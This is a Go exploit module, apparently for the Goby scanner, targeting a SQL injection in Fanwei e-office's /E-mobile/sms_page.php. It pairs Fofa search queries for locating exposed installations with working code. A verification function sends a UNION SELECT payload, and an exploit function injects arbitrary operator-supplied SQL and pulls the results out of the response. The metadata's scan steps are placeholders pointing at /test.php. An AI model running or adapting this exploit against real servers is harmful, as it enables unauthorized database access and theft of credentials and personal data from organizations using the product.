package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Panwei EOffice sms_page.php SQL Injection Vulnerability",
    "Description": "<p>Fanwei e-office is a standard collaborative mobile office platform under Fanwei. Mainly for small and medium-sized enterprises, the platform covers daily office scenarios in an all-round way, which can effectively improve the efficiency of organizational management and collaboration.</p>",
    "Product": "泛微-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2018-08-06",
    "Author": "zgk4@qq.com",
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sqli",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "泛微EOffice sms_page.php SQL注入漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微e-office是泛微旗下的一款标准协同移动办公平台。主要面向中小企业,平台全方位覆盖日常办公场景,可以有效提升组织管理与协同效率。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a><a href=\"https://www.yonyou.com/\"></a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Panwei EOffice sms_page.php SQL Injection Vulnerability",
            "Product": "泛微-EOffice",
            "Description": "<p>Fanwei e-office is a standard collaborative mobile office platform under Fanwei. Mainly for small and medium-sized enterprises, the platform covers daily office scenarios in an all-round way, which can effectively improve the efficiency of organizational management and collaboration.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p><span style=\"color: rgb(53, 53, 53); font-size: 14px;\">In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</span><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10697"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x3a,md5(232),0x3a),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "be83ab3ecd0db773eb2dc1b0a17836a1")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sqli := ss.Params["sqli"].(string)
			uri := "/E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e," + sqli + ",0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				resSQl := regexp.MustCompile(`~(.*?)~`).FindAllString(resp.Utf8Html, 2)[0]
				expResult.Output = resSQl
				expResult.Success = true
			}
			return expResult
		},
	))
}
